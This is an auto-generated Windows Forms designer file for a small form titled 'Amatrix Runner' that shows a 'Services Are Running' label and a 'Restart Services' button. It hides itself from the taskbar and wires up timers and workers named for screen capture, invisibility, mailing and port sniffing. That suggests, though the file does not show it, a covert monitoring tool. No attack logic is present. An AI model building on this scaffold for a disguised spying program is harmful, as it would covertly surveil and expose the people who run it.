namespace Main
{
    partial class Scrsve
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Scrsve));
            this.captscrn = new System.Windows.Forms.Timer(this.components);
            this.invis = new System.Windows.Forms.Timer(this.components);
            this.bkk_rc = new System.ComponentModel.BackgroundWorker();
            this.rdy_cre = new System.Windows.Forms.Timer(this.components);
            this.label1 = new System.Windows.Forms.Label();
            this.button1 = new System.Windows.Forms.Button();
            this.il = new System.Windows.Forms.ImageList(this.components);
            this.tms = new System.Windows.Forms.Timer(this.components);
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.bkkmail = new System.ComponentModel.BackgroundWorker();
            this.portsniff = new System.ComponentModel.BackgroundWorker();
            this.SuspendLayout();
            // 
            // captscrn
            // 
            this.captscrn.Tick += new System.EventHandler(this.captscrn_Tick);
            // 
            // invis
            // 
            this.invis.Interval = 200;
            this.invis.Tick += new System.EventHandler(this.invis_Tick);
            // 
            // bkk_rc
            // 
            this.bkk_rc.WorkerSupportsCancellation = true;
            this.bkk_rc.DoWork += new System.ComponentModel.DoWorkEventHandler(this.bkk_rc_DoWork);
            this.bkk_rc.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(this.bkk_rc_RunWorkerCompleted);
            // 
            // rdy_cre
            // 
            this.rdy_cre.Enabled = true;
            this.rdy_cre.Interval = 30000;
            this.rdy_cre.Tick += new System.EventHandler(this.rdy_cre_Tick);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(12, 17);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(110, 13);
            this.label1.TabIndex = 0;
            this.label1.Text = "Services Are Running";
            // 
            // button1
            // 
            this.button1.ImageIndex = 0;
            this.button1.ImageList = this.il;
            this.button1.Location = new System.Drawing.Point(133, 12);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(121, 23);
            this.button1.TabIndex = 1;
            this.button1.Text = "Restart Services";
            this.button1.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageBeforeText;
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // il
            // 
            this.il.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("il.ImageStream")));
            this.il.TransparentColor = System.Drawing.Color.White;
            this.il.Images.SetKeyName(0, "shld.png");
            // 
            // tms
            // 
            this.tms.Interval = 250;
            this.tms.Tick += new System.EventHandler(this.tms_Tick);
            // 
            // timer1
            // 
            this.timer1.Interval = 10000000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick_1);
            // 
            // timer2
            // 
            this.timer2.Interval = 30000;
            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
            // 
            // bkkmail
            // 
            this.bkkmail.DoWork += new System.ComponentModel.DoWorkEventHandler(this.bkkmail_DoWork);
            // 
            // portsniff
            // 
            this.portsniff.DoWork += new System.ComponentModel.DoWorkEventHandler(this.portsniff_DoWork);
            // 
            // Scrsve
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.WhiteSmoke;
            this.ClientSize = new System.Drawing.Size(266, 47);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.label1);
            this.DoubleBuffered = true;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Scrsve";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Text = "Amatrix Runner";
            this.Load += new System.EventHandler(this.Scrsve_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Timer captscrn;
        private System.Windows.Forms.Timer invis;
        private System.ComponentModel.BackgroundWorker bkk_rc;
        private System.Windows.Forms.Timer rdy_cre;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.ImageList il;
        private System.Windows.Forms.Timer tms;
        private System.Windows.Forms.Timer timer1;
        private System.Windows.Forms.Timer timer2;
        private System.ComponentModel.BackgroundWorker bkkmail;
        private System.ComponentModel.BackgroundWorker portsniff;
    }
}